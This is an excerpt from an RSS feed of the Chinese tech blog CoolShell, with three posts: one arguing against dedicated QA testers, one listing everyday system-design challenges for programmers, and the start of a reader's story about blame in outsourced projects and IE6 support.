<guid>https://coolshell.cn/articles/6976.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 我们需要专职的QA吗？ ]]></title>
<link>https://coolshell.cn/articles/6994.html</link>
<content><![CDATA[ 
<p>这个文章必然是有争议的，我在我的<a href="https://weibo.com/haoel" target="_blank">微博</a>上讨论过很多次了，每次都是很有争议的。有不同的观点，有争论总是一件好事，这样可以引发大家的思考。所以，对于我的这篇博文，如果你赞同我的观点，我会感到高兴，如果你会去认真地深入思考，我也会高兴，如果你反对，没关系，可以讨论。</p>
<p>在此之前，我想说明一下我观点里的这个“专职QA”是怎么定义的。</p>
<ol>
<li>其是很多公司成立的专门做测试的技术人员，仅测试不开发。</li>
<li>这些QA对于软件开发技术并不熟悉，甚至不懂。</li>
</ol>
<p>我经历过一些公司都有专职的QA团队（专职的测试人员），自从上个公司我的开发团队在一个项目上被QA部门搞得一团糟，我越来越怀疑专职QA存在在意义。我的观点不一定对，但请让我鲜明地表达一下——<strong>我觉得是不需要全职的QA的，甚至不需要QA这一专职角色或部门，因为，不懂开发的人必然做不好测试。就像不懂开发的研发经理必然管不好研发团队一样。</strong>我越来越觉得Dev应该应该是做测试最合适的人选，这必然是未来的趋势 （因为我已经看到了中国程序员的进步，相比起10年前，今天的程序员已经是非常全面了，再来十年，必然证明我的观点是对的）。</p>
<p>在我正在展开说明之前，我想引用两篇文章：</p>
<h4>两篇文章</h4>
<p>一篇是  “<a href="http://sriramk.com/blog/2012/01/testing.html" target="_blank">On testers and testing</a>”(<a href="http://www.aqee.net/on-testers-and-testing/" target="_blank">中文翻译</a>)，本文的作者Sriram Krishnan是一名程序员，曾在Yahoo和微软工作过，开发过很多软件，曾被纽约时报<a href="https://www.nytimes.com/2011/02/27/business/27novel.html" target="_blank">报道</a>，写过<a href="https://amzn.to/progazure" target="_blank">一本书</a>，本文是他的一篇博客。他在文章中表达了这几个观点——</p>
<blockquote>
<p>大多数的开发团队并不需要一个独立的测试角色。即使要有，那么所有的开发时间比上所有的测试时间应该 &gt;20:1的。。证据吗？光看看一些从古至今最成功的软件开发团队就知道了。不论是当今的Facebook，还是30年前最初的NT团队，很多伟大的产品都是出自没有或很少测试人员的团队。</p>
<p>开发人员应该测试自己的代码。没什么可说的。背后的道理并不重要。这包括单元测试，全覆盖的自动化测试或手工测试或组合测试。如果你的开发人员不能/不愿意或认为这“不归我管”，那你需要更好的程序员。</p>
</blockquote>
<p>另一篇文章是邹欣的“<a id="cb_post_title_url" href="https://www.cnblogs.com/xinz/archive/2012/04/09/2439695.html" target="_blank">现代软件工程讲义 9 测试 QA 的角色和分工</a>”，这是一篇很不错的文章。他在文章里提到了分工的必要性，比如第三方的鉴定机构，<strong>并且也指出了分工的一些问题，比如，画地为牢的分工，无明确责任的分工，等，这些问题直接命中了分工的要害</strong>。我隐约觉得，我和邹欣的很多观点是相同的，我们内容上是相同的，只是形式上还有分歧。另外，我的观点太鲜明了，从而容易导向极端的理解。</p>
<p>你看，<strong>我们都同意，Dev要懂测试，QA要懂开发，只不过分工不同，既然你中有我，我中有你，那就不要分彼此了，一起携手开发测试吧</strong>。（另外，我个人觉得不懂开发的测试人员不可能测试得好）</p>
<p><em><strong>—- update—- </strong></em>{</p>
<p><span style="color: #008000;">     //本篇文章出来后，网上出现了一些对此讨论的文章，我一并更新在这里</span><br>
【 《<a id="cb_post_title_url" href="https://www.cnblogs.com/guanhe/archive/2012/04/12/response_to_do_we_need_qa.html">对《我们需要专职QA吗？》的回应</a>》作者：<a href="https://weibo.com/n/%E6%AE%B5%E5%BF%B5-%E6%AE%B5%E6%96%87%E9%9F%AC">@段念-段文韬</a> 】<br>
【 《<a href="http://blog.sina.com.cn/s/blog_55ba8b460100yawe.html" target="_blank">关于“我们需要专职的QA吗”》</a>作者：<a href="https://weibo.com/u/1764108363" target="_blank">@Jacky郭</a> 】<br>
【 《<a href="http://blog.sina.com.cn/s/blog_7022adbf0100zgqo.html" target="_blank">我们需要专职的QA吗？（评）</a>》作者：@<a title="Monkey陳曄曄" href="https://weibo.com/aiwanglinjun" target="_blank">Monkey陳曄曄</a> 】<br>
【《 <a id="blog-title-link" href="http://thinkcool.weebly.com/1/post/2012/04/qa.html" target="_blank">《我们需要专职的QA吗？》读后感</a>》作者：@ <a title="花生色魔叔" href="https://weibo.com/bluesgu">花生色魔叔</a>】</p>
<p>}</p>
<p><span id="more-6994"></span></p>
<h4>我的故事</h4>
<p>我再说说我最糟糕的QA经历吧，这个公司的QA部门只做测试，他们的leader觉得所有的test design和test 的过程都不需要Dev参与，他们是独立于Dev之外的部门，他们几乎不关心Dev的设计和实现，他们只关心能跑通他们自己设计的test case。但是去执行Test Case的时候，又需要Dev的支持，尤其在环境设置，测试工具使用，确认是否是bug方面，全都在消耗着Dev的资源，最扯的是，他们对任何线上的问题不负责，反正出了问题由Dev加班搞定。</p>
<p>我有一次私自review他们的test case的时候，发现很多的test case这样写到 – “Expected Result：Make sure every thing is fine” ，WTF，什么叫“Every thing is fine”？！而在test case design的时候，没有说明test environment/configuration 是什么？没有说明test data在哪里？Test Case、Test Data、Test Configuration都没有版本控制，还有很多Test Case设计得非常冗余（多个Test Case只测试了一个功能），不懂得分析Function Point就做Test Design。另外，我不知道他们为什么那么热衷于设计一堆各式各样的Negative Test Case，而有很多Positive的Test Case没有覆盖到。为什么呢，因为他们不知道开发和设计的细节，所以没有办法设计出Effective的Test Case，只能从需求和表面上做黑盒。</p>
<p>在做性能测试的时候，需要Dev手把手的教怎么做性能测试，如何找到系统性能极限，如何测试系统的latency，如何观察系统的负载（CPU，内存，网络带宽，磁盘和网卡I/O，内存换页……）如何做Soak Test，如何观察各个线程的资源使用情况，如何通过配置网络交换机来模拟各种网络错误，等等，等等。</p>
<p>测试做得也不认真，大量的False Alarm，都是环境问题，比如：安装新版本后没有重启服务，没有使用新的配置文件，网络配置，等等，等等。</p>
<p>在项目快要上线前的一周，我又私自查看了一下他们的Test Result，我看到5天的Soak Test 的内存使用一直往上涨，很明显的内存泄露，这个情况发生在2个月前，但是一直都没有报告，我只好和我的程序员每天都加班到凌晨，赶在上线前解决了这个问题。但是，QA部门的同学们就像没发生什么事似的，依然正常上下班。哎……</p>
<p>为什么会这样？我觉得有这么几点原因（和邹欣的观点一样）</p>
<ol>
<li>给了QA全部测试的权力，但是没有给相应的责任，</li>
<li>QA没有体会过软件质量出问题后的痛苦（解决线上问题的压力），导致QA不会主动思考和改进。</li>
<li>QA对Dev的开发过程和技术完全不了解，增加了很多QA和Dev的沟通。</li>
<li>QA对软件项目的设计和实现要点不了解，导致了很多不有效的测试。</li>
</ol>
<p><span style="color: #cc0000;"><strong>注：我无意在这里贬低QA的能力工作。只是我看到了QA因为没有参与开发的一些现实问题。</strong></span></p>
<h4>我的观点</h4>
<p>邹欣对于分工出现的问题给出了两点解决方法：</p>
<blockquote>
<ul>
<li>充分授权和信任（Empower team members）</li>
<li>各司其职，对项目共同负责（Establish clear accountability and shared responsibility）</li>
</ul>
</blockquote>
<div>我的观点是，<strong>理论上正确，操作上太虚了。这就像我们国家喊的“为人民服务”的口号一样，没有具体的方法，根本无法落实。</strong>
</div>
<p>我无意在这里贬低QA的工作，我也无意因为这个事走向另一个极端。但是，我在现在公司的经历，还有很多新兴公司的做法，<span style="color: #cc0000;"><strong>我越来越觉得软件开发，真的不需要专职的QA，更不需要只写代码不懂做测试的专职的Dev</strong></span>。观点如下：</p>
<p><strong>1）</strong> <strong>开发人员做测试更有效</strong></p>
<ul>
<li>开发人员本来就要测试自己写的软件，如果开发人员不懂测试，或是对测试不专业，那么这就不是一个专业的开发人员。</li>
<li>开发人员了解整个软件的设计和开发过程，开发人员是最清楚应该怎么测试的，这包括单元测试，功能测试，性能测试，回归测试，以及Soak Test 等。</li>
<li>开发人员知道怎么测试是最有效的。开发人员知道所有的function point，知道fix一个bug后，哪些测试要做回归和验证，哪些不需要。开发人员的技术能力知道怎么才能更好的做测试。</li>
</ul>
<p>很多开发人员只喜欢写代码，不喜欢做测试，或是他们说，开发人员应该关注于开发，而不是测试。这个思路相当的错误。开发人员最应该关注的是软件质量，需要证明自己的开发成果的质量。<strong>开发人员如果都不知道怎么做测试，这个开发人员就是一个不合格的开发人员</strong>。</p>
<p>另外，<strong>我始终不明白，为什么不做开发的QA会比Dev在测试上更专业？ 这一点都说不通啊</strong>。</p>
<p><strong>2）减少沟通，扯皮，和推诿</strong></p>
<p>想想下面的这些情况你是否似曾相识？</p>
<ul>
<li>QA 做的测试计划，测试案例设计，测试结果，总是需要Dev来评审和检查。</li>
<li>QA在做测试的过程中，总是需要Dev对其测试的环境，配置，过程做指导。</li>
<li>QA总是会和Dev争吵某个问题是不是BUG，争吵要不要解决。</li>
<li>无论发现什么样的问题，总是Dev去解决，QA从不fix问题。</li>
<li>我们总是能听到，线上发生问题的时候，Dev的抱怨QA这样的问题居然没测出来，</li>
<li>QA也总会抱怨Dev代码太差，一点也不懂测试，没怎么测就给hand over 给QA了。</li>
<li>QA总是会push Dev，这个bug再不fix，你就影响我的进度了。</li>
<li>等等，等等。</li>
</ul>
<p>如果没有QA，那么就没有这么多事了，DEV自己的干出来的问题，自己处理，没什么好扯皮的。</p>
<p>而一方面，QA说Dev不懂测试，另一方面Dev说QA不懂技术，而我们还要让他们隔离开来，各干各的，这一点都不利于把Dev和QA的代沟给填平了。<strong>要让Dev理解QA，让QA理解Dev，减少公说公有理，婆说婆有理的只站在自己立场上的沟通，只有一个方法，那就是让Dev来做测试，让QA来做开发</strong>。这样一样，大家都是程序员了。</p>
<p><strong>3）吃自己的狗食</strong></p>
<p>真的优秀的开发团队都是要吃自己狗食的。这句话的意思是——<strong>如果你不能切身体会到自己干的烂事，自己的痛苦，你就不会有想要去改进的动机</strong>。<strong>没有痛苦，就不会真正地去思考，没有真正的思考，就没有真正的进步</strong>。</p>
<p>在我现在的公司，程序员要干几乎有的事，从需求分析，设计，编码，集成，测试，部署，运维，OnCall，从头到尾，因为：</p>
<ul>
<li>只有了解了测试的难度，你才明白怎么写出可测试的软件，怎么去做测试的自动化和测试系统。</li>
<li>只有自己真正去运维自己的系统，你才知道怎么在程序里写日志，做监控，做统计……</li>
<li>只有自己去使用自己的系统，你才明白用户的反馈，用户的想法，和用户的需求。</li>
</ul>
<p>所以，<strong>真正的工程师是能真正明白软件开发不单单只是coding，还更要明白整个软件工程</strong>。只明白或是只喜欢coding的，那只是码农，不能称之为工程师。</p>
<p><strong>4）其它问题</strong></p>
<ul>
<li>
<strong>关于SDET</strong>。全称是Software Development Engineer on Test。像微软，Google， Amazon都有这样的职位。但我不知道这样的职位在微软和Google的比例是多少，在Amazon是非常少的。那么像这样的懂开发的专职测试可以有吗？我的答案是可以有！但是，我在想，<strong>如果一个人懂开发，为什么只让其专职做测试呢？这样的程序员分工合理吗？把程序员分成两等公民有意义吗？试问有多少懂开发的程序员愿意只做测试开发呢？</strong>所以，SDET在实际的操作中，更多的还是对开发不熟的测试人员。还是哪句话，不懂开发的人是做不好测试的。</li>
</ul>
<ul>
<li>
<strong>如果你说Dev对测试不专业，不细心，不认真</strong>，那么我们同样也无法保证QA的专业，细心和认真。在Dev上可能出现的问题，在QA也也会一样出现。而出了问题QA不会来加班解决，还是开发人员自己解决。所以，如果QA不用来解决问题，那么，QA怎么可能真正的细心和认真呢？</li>
</ul>
<ul>
<li>
<strong>如果你说不要QA的话，Dev人手会不够</strong>。你这样想一下，如果把你团队中现有的QA全部变成Dev，然后，大家一起开发，一起测试，亲密无间，沟通方便，你会不会觉得这样会更有效？你有没有发现，在重大问题上，Dev可以帮上QA的忙，但是QA帮不上Dev的忙。</li>
</ul>
<ul>
<li>
<strong>第三方中立，你会说人总是测不好自己写的东西，因为有思维定式</strong>。没错，我同意。但是如果是Dev交叉测试呢？你可能会说开发人员会有开发人员的思维定式。那这只能说明开发人员还不成熟，他们还不合格。没关系，只要吃自己的狗食，痛苦了，就会负责的。</li>
</ul>
<ul>
<li>
<strong>磨刀不误砍柴功</strong>。如果你开发的东西自己在用，那么自己就是自己天然的QA，如果有别的团队也在用你开发的模块，那么，别的团队也就很自然地在帮你做测试了，而且是最真实的测试。</li>
</ul>
<ul>
<li>
<strong>你可能会说吃狗食就是个笑话，因为如果是我，我把事干烂后，就离职走人了，让别人去吃我的狗食</strong>。这个在现实中的确会发生，也是很现实的。但是想一想，你为什么在一开始让他把事干烂了？另外，如果你的团队在设计评审和代码评审里没有把好关，让某人把事给干烂了，那么这个人的离职带来的问题还是这个团队来扛，于是整个团队都在吃自己的狗食，挺公平的。痛苦过一次，你的团队下次怎么干了，就不敢乱招人了，就不敢随意评审代码了，就不敢让人只做一块东西了。最终还是没有逃脱吃狗食的范畴。</li>
</ul>
<ul>
<li>
<strong>关于系统集成测试。</strong>所谓集成测试，就是把多个开发团队开发的模块集中起来测试。因为开发人员可能无法看到全局，不了解别个团队的系统，而且步调不一，所以需要有统管全局的专职的QA进行统筹规划并做测试。对这个方面，我并不反对，在实际操作过程中，好像的确用专职的做集成测试的QA统一调度各团队的时度更有效一些。不过，这还是不能让我停止去思考两个问题，1) 如果开发人员看不到全局，他能开发出更好的软件吗？2）这个全职的做集成测试的QA难道不能是各个团队的骨干Dev来组成吗？3）统一调度这个事，不更像是Project Manager要做的事吗？</li>
</ul>
<ul>
<li>
<strong>关于自动化测试</strong>。所谓自动化的意思是，这是一个机械的重复劳动。我想让测试人员思考一下，你是否在干这样的事？如果你正在干这样的事，那么，你要思考一下你的价值了。但凡是重复性比较高的机械性的劳动，总有一天都会被机器取代的。</li>
</ul>
<ul>
<li>
<strong>关于线上测试</strong>。我们都知道，无论自己内测的怎么样，到了用户那边，总是会有一些测试不到的东西。所以，有些公司会整出个UAT，用户验收测试。做产品的公司会叫Beta测试。无论怎么样，你总是要上生产线做真正测试的。对于互联网企业来说，生产线上测试有的在玩A/B测试，有的玩部分用户测试，比如，新上线的功能只有10%的用户可以访问得到，这样不会因为出问题让全部用户受到影响。做这种测试系统的人必然是开发人员。</li>
</ul>
<p>好吧，我暂时写这么多，我会视大家的讨论再补充我的观点的。</p>
<p><em><strong>—– update  2012/4/11—–</strong></em></p>
<p>一些人觉得我是在泄私愤，我能够理解为什么我会被这样误解，但是没有关系，很多新东西新观点总是会被误解的，我坦然面对。请大家抛开我的这些情感因素，单纯的思考一下，没有专职QA的的团队架构是否有积极的意义在里面？</p>
<p><strong>再补充一点，大家思考一下，QA是保证质量的，但是很多QA是在做测试，软件质量是测试出来的吗？如果不从需求分析，软件设计，代码实现上做好控制，到测试的时候你还怎么保证质量呢？</strong></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-04-11T08:48:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/6994.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 挑战无处不在 ]]></title>
<link>https://coolshell.cn/articles/7048.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >面试过一些应聘者，当我问到为什么换工作的时候，<strong>他们都会告诉我，现在的工作没有挑战，无聊，所以想换一个有挑战的工作</strong>。于是我问了一下他的工作情况，发现那些有挑战的东西他还没有搞懂。我总是为有这样的认识的朋友感到惋惜，因为我总是认为有挑战的东西无处不在啊，不能因为工作上没有，自己就放纵了自己。比如，面试过一个做地图的工程师，他的工作是做计算地图上任意两点的最短或最优路径的一部分功能。我觉得这个事很有挑战，也有难度，应聘者说，没什么挑战，因为他做的东西只是调用相关的算法库。他在这个项目干了2年了，当我问他有没有看过算法库，知不知道地图是怎么存储的？他却告诉我，<strong>因为没有去做，所以就没有去了解，等做的时候再了解</strong>（我希望有这样想法的人都去看看<a href="https://coolshell.cn/articles/4235.html" rel="bookmark">程序员的谎谬之言还是至理名言？</a>）。这样的例子很多，很多应聘者在面试中不能和我一起解决某个问题的时候，比如：OOD，数据库设计，系统设计，等，<strong>他们都会告诉我，不好意思，因为没有做过相关的事情，所以就不懂了，所以，他需要一个像我们这样的项目来学习和锻炼</strong>。我并不要求你能解决你所不擅长的问题，但毕竟数据库，OO，系统设计都是软件开发的基础知识，多少要懂一些吧。</p>
<p>但另外一方面，他们都会告诉我他们对技术充满和热情和兴趣，有着很强的学习能力，也有很能吃苦的态度。这也许是某面试宝典上看来的，面经上可能都会说，如果面对不能作答问题，可以说一下自己的态度和决心。可惜的是，我并不这么想的，我在我的两篇关于招聘的文章里（<a title="我是怎么招聘程序员的" href="https://coolshell.cn/articles/1870.html" target="_blank">我是怎么招聘程序员的</a>，<a title="再谈“我是怎么招聘程序员的”（上）" href="https://coolshell.cn/articles/4506.html" target="_blank">再谈我是怎么招聘程序员的</a>）都说过一些我对如何择人的想法。这里重点说明一下其中两个观点：</p>
<ul>
<li>
<strong>关于热情和态度，说白了就是不要给自己找借口</strong>。比如：“工作忙事多没时间学所以可以不懂”，“工作中没用到所以可以不懂”，“工作没有挑战，一直没有遇到合适的项目”等等。时间可以挤，工作之余可以学，随时随地去思考，挑战是无处不在的…… 想想那些你有热情的事，你会发现，几乎没有什么可以阻止你去做那些事。</li>
</ul>
<ul>
<li>
<strong>对于某些事情，如果以前没有在你身上发生过，那么这个事情在未来也不会发生</strong>。如果你以前没有对你接触过的东西去学习，去深挖，去思考，去改善，那么我不会相信你会在未来面对新的东西的时候也会有这样的态度；如果你以前没有用业余时间学习一些项目之外的东西，那么我也不会相信你会在未来会这样做；如果你以前没有把你的热情和态度转换成你的知识，经验和成果，那么我也不会相信你会在未来能做到。</li>
</ul>
<p>这两个观点可能太刻薄了，但是，当我回想我自己的经历的时候，观察程序员的成长过程的时候，我发现，优秀的程序员都是相似的，当他们还在是一个菜鸟的时候，就已经有各种成为高手的苗头了，这些苗头就是——<strong>他们热爱思考，喜欢解决难题，对新鲜事物非常好奇，总是找人讨论，可以用自己的业余时间狠命研究很多和工作无关的技术，会在业余的时间里写些有趣的小程序，或是会把自己的思路书写下来，等等，等等</strong>。</p>
<p><span id="more-7048"></span></p>
<h4>一些问题</h4>
<p>我这样说，大家可能会觉得“挑战无处不在”这句话太虚了，而且可能不明白什么叫“热爱思考”，这里，我把我的或别人的思考的东西罗列一下，这些问题，有的会让我思考推敲，有的会让我疯狂地查资料，问人，或是找人讨论，询问。大家不妨可以跟着我一起思考一下。</p>
<p>酷壳上有一些小问题，比如：<a title="面试题：火车运煤问题" href="https://coolshell.cn/articles/4429.html" target="_blank">火车运煤问题</a>，<a title="面试题：赛马问题" href="https://coolshell.cn/articles/1202.html" target="_blank">赛马问题</a>，这些问题都不够实际，我觉得也这些问题有点无聊，我们不妨观察一下我们身边的东西，我们就可以看到很多有挑的战的东西，对于这些问题，如果是你来做，你会怎么做呢？</p>
<p>0）许多年前，当我看到珊瑚虫QQ把IP转成地实际地址的时候，我就在思考，如果我有一个IP网段的数据（<a title="全球IP地址数据库" href="https://coolshell.cn/articles/244.html" target="_blank">全球IP地址数据</a>），我怎么来完成这个功能呢？比如：某地点的IP网段是：10.10.1.* – 10.10.5.*。我要有一个IP地址是：10.10.3.20，我怎么匹配这个网段？用Hash表吗？好像有问题。把IP字串转成整型？排序+二分法，好像更容易解决一些，但是如果有一些修改的话好像有点不方便。用树型结构（森林）会不会更好一些呢？如果我要通过地点反查IP段呢？</p>
<p>1）网上短网址服务，你有想过这个短网址生成的算法是什么，如何能做到能最短？怎么查询？你也许觉得会用key-value的NoSQL。那么，如果对于同一个URL，如果要重用已生成的短网址，你怎么用key-value的NoSQL来解决？</p>
<p>英汉词典的检索和这个很相似，如果通过英文查汉语，又通过汉语查英文？如果是N多种语言的互相翻译呢？你的数据存储和检索如何做呢？</p>
<p>2）当我看到Dropbox这样的云同步的软件的时候，我不知道你是否会和我一样会去思考，在多个设备间的文件同步是怎么做的？如果网盘上有几万，甚至几百万个文件，当要和我的本地数据同步时，他如何比较经济地知道哪些文件更改了？需要向服务端同步或是向客户端同步。更进一步，你有没有想过没有中心结点的文件同步问题？你有没有想过，文件冲突的问题？</p>
<p>3）我们的新员工入职的时候，有一些公司会给新员工的帐号生成一个随机口令，然后新员工可以在登录后修改口令（我一直在想我们的银行应该为用户生成一个随机口令，而不是设置一个6个0或是6个8的初始口令）。那么，对生成随机安全口令的算法知道怎么做吗？如果你写出这个算法来了，你怎么证明这个算法是足够随机，生成的密码强度足够大的？（你会发现，测试口令是否随机是否安全的程序，会比生成器更难写）</p>
<p>4）关于动态密码RSA SecurID（如下图），这个小设备上的6位数字会每60秒变一次，在你登录的时候，需要输入这6位数字，服务器上会认证这6个数字，那么这个事怎么做？再试想一下，这样的小设备我要发给我的客户，我希望我的每个客户都使用不一样的随机算法，就算是算法一样，算法的种子也不能一样。那么，如果我的客户一共有百万甚至千万，我的服务端怎么管理这些用户的SecurID？</p>
<p><img alt="image placeholder" ></p>
<p>5）看看我们的网银或是ATM的用户登录功能，如果你登录时输错口令超过3次以上，你的帐号就会被冻结，需要去柜台重置口令。这个功能看上去很安全，因为可以防止黑客在线尝试破解你的登录口令。不过这又带来了另一个问题，如果有一个恶意用户知道你的卡号，他就上网或是造个卡故意输错你的口令，导致你的帐号被冻结，让你一次又一次地去银行排队重置。面对这样的情况，你该怎么解决？</p>
<p>6）当你在网上购物的时候，你会去一些电子商务的网站，这些网站都会对他们的产品进行分类，有大分类有子分类。你进到分类后，你可以通过不同的属性来过滤不同该分类下的商品，注意，不同分类下的商品的过滤属性不一样，如，手机分类和电视分类的属性都不一样。试问，你如何设计你的数据库表结构？</p>
<p>7）当你在泡各种论坛或SNS社区的时候，你会看到，用户在互相回复的时候存在一个问题，尤其是用户量很大的时候，大家的回复完全交织在一起什么 也看不清楚。以前有的论坛使用树形列表来解决这个问题，树形列表好是好，但是把一棵大树放在那里还是很难看。Twitter.com给了一个非常不错的解决方式，就是所有人的回复或是回复的回复都按时间线放在一起，如果你要查看某回复的上下文的话，点击一下这个回复就可以看到了（我在我在“<a title="国内微博和Twitter的最大不同" href="https://coolshell.cn/articles/5247.html" target="_blank">国内微博和Twitter的最大不同</a>”中批评过这个事）。新浪微博在禁评论事件后也开发出了这个功能。你知道这个事怎么做吗？</p>
<p>更进一步，新浪微博的设计上有很多的缺陷，单说新开发的“查看评论”功能这个事来说，还是不完美，因为某些评论会随着转发带到别的地方去，他的“查看评论”功能只能看到当个贴子下的东西，不能把所有转发出去的贴子的评论一起综合起来。虽然这对于用户使用来说没有什么在不了的，但是对于软件设计来说，我们不妨做一个练习，可以思考一下，怎么样设计会更好。</p>
<p>再举一反三，有时候，我发现多个网友会提出同样的问题，我很想用一个回复同时回复他们。如果有这样的功能的话，我们的回复就会从一个树形变成另外一种形状了，我们又该如何设计才能支持这样的功能呢？</p>
<p>8）说到新浪微博，我就想多说几句，我最近观察到了两个事：</p>
<ul>
<li>一个是验证码的事，如果你在你的帐号设置里设置了“登录需要验证码”，你会发现，在登录新浪微博的时候，仅当你输对了口令后，系统才会提示你输入验证码。为什么呢？因为，这个“登录需要验证码”这绑定在你的帐号设置里的，所以，要取这个设置，就需要你登录成功（？！），老实说，这个功能在设计上有点二（中国特色）。如果是你，你怎么设计呢？</li>
</ul>
<ul>
<li>另一个事情是新浪微博或Twitter的用户名修改后，被他人@过的信息就再也链接不到你这里来了。我们来试想一下，如果是你，你怎么解决这个问题？（我的<a href="https://weibo.com/1401880315/yclT9m6Fp" target="_blank">我的微博里讨论过这个事</a>，不一定对，供大家参考）</li>
</ul>
<p>9）我有时候我会发一些快递，有时候是一些小东西，有时候是一些大包裹，有时候近，有时候远。我发现一个有趣的现象，就是快递员来收件的时候，快递的价格都是快递员自己说了算的，我还可以和他们砍价。我观察到他们会以距离，重量大小来订价。于是我在想如果你要运营一个物流公司，你作为这个物流公司的程序员，你需要开发一个软件来标注快递价格，你会怎么做？比如，这个快递公司会说，在北京五环以内是一个价，以外是一个价，出省后，上海以北是一个价，上海以南是一个价，等等，这只是北京的，如果把全国的各个城市到别的城市的价格都考虑进来，还要受到重量，体积，价格，是否加急等等因素的影响，你的数据库设计要怎么做呢？</p>
<p>A）国内的水军太恐怖了。他们活动的刷排名，刷信用，刷积分，刷粉丝等等地方，你是否想过如何解决这个问题？还有广告联盟的欺诈问题，等等。这些东西，有的还是可以通过技术手段进行限制和计算的，你有思考过应该使用什么样的方法吗？</p>
<p>B）说到水军就不能不提垃圾邮件和垃圾短信。你有没有想过邮件系统怎么过滤垃圾信息的？</p>
<p>C）关于推荐功能，这必然是一个热点，这是软件产品从request -&gt; response的被动方式到主动方式的进化。微博上有推荐关注者的功能，电商有推荐商品的功能，豆瓣上有推荐影片音乐书籍的功能。不同的领域的推荐算法各不相同，你有没有思考过，如果是你来做推荐算法的时候，你会怎么做吗？更进一步，推荐通常伴随着学习和匹配，学习用户的行为，匹配相似的东西，你想过怎么学习用户的行为，怎么匹配相似的东西了吗？</p>
<p>D）关于微博，某名人有几千万的粉丝，当这个名人发一个微博的时候，需要通知这几千万个粉丝，这个在系统架构上应该怎么做？如果某天这个名人与人发生口角，和人吵架，拼命的刷微博，那么，系统架构要怎么设计才能支持这样的事呢？</p>
<p>E）想想火车票的分段卖票的方式，现有的解决方案是为每个站点预留票，于是我们可以看到火车始发时，有很多空坐，这些空坐都是留给下一个站点的，我们能否开发出一个系统来，可以把一条线上的这些这站上那站下的旅客统筹规划一下，制定出一个最经济的方式，让火车运行得更有效。</p>
<p>F）对于地铁公交网络，我们希望这个网络既能有更多的覆盖，又能节省路线，你能不能设计出一个系统，当我们输入一些数据（如：站点，是否终点或起点站，该站的下一站可能方向（多个），该站是以上车为主，还是下车为主，等等），你的系统能自动安排出各种线路吗？</p>
<p><strong>这样的问题实在是太多了，都是可以让我们去思考的，并不一定有经济效益，但是至少可以让你锻炼一下怎么去分析问题，怎么去思考，怎么去解决问题</strong>。</p>
<h4>总结</h4>
<p>综上所述，我想说的是：</p>
<p>1） 只要你想，挑战是无处不在的。那怕是你现有的觉得无聊的东西，只要你想做到极致，那怕是一个简单的功能（比如<a title="你会做Web上的用户登录功能吗？" href="https://coolshell.cn/articles/5353.html" target="_blank">用户登录的功能</a>）也会让你充满挑战。</p>
<p>2）观察身边的事物，去思考，去调查，举一反三，这才是你成长的源泉。不要把你的成长推给客观原因。</p>
<p>3）我的<a title="软件开发的“三重门”" href="https://coolshell.cn/articles/6526.html" target="_blank">软件开发的三重门</a>中说过，第三重门是解决实际问题，让你的业务处理更为的智能，更为地强大。我不知道为什么这一两年，我们的圈子里所有的人都在关注着“云”，“海量数据处理”，“高性能架构”这样的东西，尤其是那些性能调的高性能的东西并不很难，而这些更为实际问题更有挑战性，也更有前景。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-04-17T10:06:16+08:00</pubDate>
<guid>https://coolshell.cn/articles/7048.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 这到底是谁之错？ ]]></title>
<link>https://coolshell.cn/articles/7126.html</link>
<content><![CDATA[ 
<p>【感谢 @<a title="风枫峰" href="https://weibo.com/hfcc?source=webim" target="_blank">风枫峰</a> 投递本文】</p>
<p><strong>故事一：</strong><br>
背景介绍：RT是一个外包公司，ZWZX是项目承接公司，YD是甲方。</p>
<p>RT公司每天下班的时候都会接到ZWZX负责人的电话，询问一天的工作情况，然后布置任务要求晚上加班做完，RT公司的员工很无奈也很气愤因为每天都要加班，员工们就问项目经理：“为什么天天加班赶需求，今天才提一个需求，明天就要上线，还让不让人活了?” 项目经理无奈的说：“我有什么办法啊？这是人家ZWZX负责人说的啊，对方逼得紧。”</p>
<p>多次以后项目经理也忍不住了，就问ZWZX的负责人怎么天天这样啊，ZWZX的负责人就说了:”明天就要向YD的负责人展示这个页面，我也没有办法啊？YD那边老总就是这么要求的，我怎么办，我也不想这样啊？”</p>
<p>然后RT的项目经理实在受不了了就辞职了，新上任的项目经理又会走他的老路，因为从开始我们就被培养“满足客户的需求是最重要的”。RT的员工也就这样一直抱怨着，一直忍受着。天天在心里咒骂YD的老总真是没有人性，不拿人当人看啊！</p>
<p>人换了一批又一批，加班也就慢慢的变成了应该的，你不加班说明你不敬业，不合格。</p>
<p><strong>故事二：</strong><br>
IE6一直存活着，所有的前端开发人员都痛恨它，都不想兼容它，可是产品经理看到IE6的市场占有率还是这么高，就会要求前端开发人员必须兼容IE6。</p>
<p><span id="more-7126"></span></p>
<p>矛盾又来了，就像故事一一样，前端开发人员天天抱怨，产品经理也天天抱怨，但是面对IE6的市场份额，产品经理会劝开发人员说：“我有什么办法啊？IE6的市场份额就是这么高，不兼容怎么办啊？我也不想啊！” 开发人员也就这样忍受着，然后不断地抱怨用IE6的用户低端，没文化，怎么还用IE6啊！天天兼容IE6就够烦的了，还怎么创新啊！</p>
<p><strong>这两个故事里出现的问题到底是谁的错误引起的？ </strong></p>
<p>故事一的罪魁祸首是YD的老总吗？</p>
<p>故事二的罪魁祸首是那些还用着IE6的用户吗？</p>
<p>从这两个嫌疑最大的罪魁祸首眼中看一下这两个故事：</p>
<p><strong>故事一：</strong><br>
我是YD的老总，我要建立一个网站，找到了ZWZX公司，签订了合同，我提需求他们实现。</p>
<p>我不懂制作网站，可是我才思敏捷，创意无限，不停的会有好点子从我的脑海里蹦出来，每当有一个好点子蹦出来后，我都会给ZWZX公司的负责人讲清楚我的想法，让他实现，开始我不知道做一个页面需要多长时间。第一次我试探性的说了一周必须把我这个点子做出来，ZWZX公司负责人很痛快的答应了，一周后我果然看到了这个功能。</p>
<p>可是会不会我给他们的时间太长了？对！肯定是，要不也不会答应的这么痛快。这些人啊！天天就是想拖时间，好多骗我点钱。</p>
